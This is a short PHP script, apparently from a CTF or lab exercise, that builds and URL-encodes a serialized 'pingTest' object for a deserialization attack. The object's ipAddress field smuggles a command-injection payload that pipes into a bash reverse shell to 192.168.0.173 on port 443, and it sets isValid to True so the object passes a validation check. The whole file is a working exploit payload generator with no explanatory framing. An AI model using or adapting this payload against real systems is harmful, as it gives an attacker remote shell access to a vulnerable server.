<?php

class pingTest
{
    public $ipAddress = '127.0.0.1|bash -i >& /dev/tcp/192.168.0.173/443 0>&1';
    public $isValid = True;
}

$obj = new pingTest();

echo urlencode(serialize($obj));

?>
